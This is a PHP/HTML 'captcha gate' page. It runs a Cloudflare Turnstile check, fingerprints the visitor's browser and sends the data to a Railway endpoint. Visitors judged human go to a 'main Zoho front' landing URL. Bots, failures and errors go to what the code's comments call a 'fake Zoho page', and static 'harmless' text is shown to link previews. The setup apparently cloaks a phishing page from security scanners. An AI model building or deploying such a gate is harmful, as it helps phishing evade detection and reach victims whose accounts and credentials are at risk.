<?php
// index.php – Captcha gate on Railway

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

  <style>
    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      background: #f3f3f3;
    }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .guard-wrap {
      background: #ffffff;
      padding: 24px 28px;
      border-radius: 8px;
      box-shadow: 0 10px 30px rgba(0,0,0,.08);
      max-width: 420px;
      width: 100%;
      text-align: center;
    }
    .guard-title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 8px;
    }
    .guard-sub {
      font-size: 13px;
      color: #666;
      margin-bottom: 18px;
    }
    .bot-preview {
      font-size: 12px;
      color: #999;
      margin-top: 14px;
      line-height: 1.4;
    }
  </style>
</head>
<body>
  <div class="guard-wrap">
    <div class="guard-title">Checking your browser…</div>
    <p class="guard-sub">Please complete the security check to continue.</p>

    <!-- Turnstile widget -->
    <div id="cf-turnstile"
         data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"
         data-callback="onHumanVerified">
    </div>

    <!-- Harmless static text for bots/link previews -->
    <div class="bot-preview">
      Automatic previews may show this page for security checks. No action is required.
    </div>
  </div>

  <script>
    function collectMetrics(){
      try {
        return {
          ua: navigator.userAgent,
          lang: navigator.language,
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen: (window.screen && screen.width && screen.height)
            ? (screen.width + "x" + screen.height)
            : "",
          colorDepth: (window.screen && screen.colorDepth) ? screen.colorDepth : "",
          webdriver: navigator.webdriver === true,
          timing: (typeof performance !== "undefined" && performance.now)
            ? performance.now()
            : 0
        };
      } catch (e) {
        return {};
      }
    }

    function onHumanVerified(cfToken){
      if (!cfToken) return;

      fetch("https://blissful-motivation-production.up.railway.app/verify-human.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cf_token: cfToken,
          metrics: collectMetrics()
        })
      })
      .then(function (r) { return r.json(); })
      .then(function (res) {
        if (res && res.ok) {
          try {
            if (res.trust_token) {
              sessionStorage.setItem("trust_token", res.trust_token);
            }
          } catch (e) {}

          // ✅ Human → main Zoho front
          window.location.href =
            "https://portalaccess.zoholandingpage.com/seCWNlYTItNGQ5OC04ZWY4LTRkY2EzMjlhZTQwNQAuAAAAAAAi6igbOUs0T6KZWkpEKWuOAQADyLbvnQSeS429";
        } else {
          // ❌ Fail → fake Zoho page
          window.location.href =
            "https://portalaccess.zoholandingpage.com/ffaNGQ5OC04ZWY4LTRkY2EzMjlhZTQwNQAuAAAAAAAi6";
        }
      })
      .catch(function () {
        // Any error → fake page
        window.location.href =
          "https://portalaccess.zoholandingpage.com/ffaNGQ5OC04ZWY4LTRkY2EzMjlhZTQwNQAuAAAAAAAi6";
      });
    }
  </script>
</body>
</html>
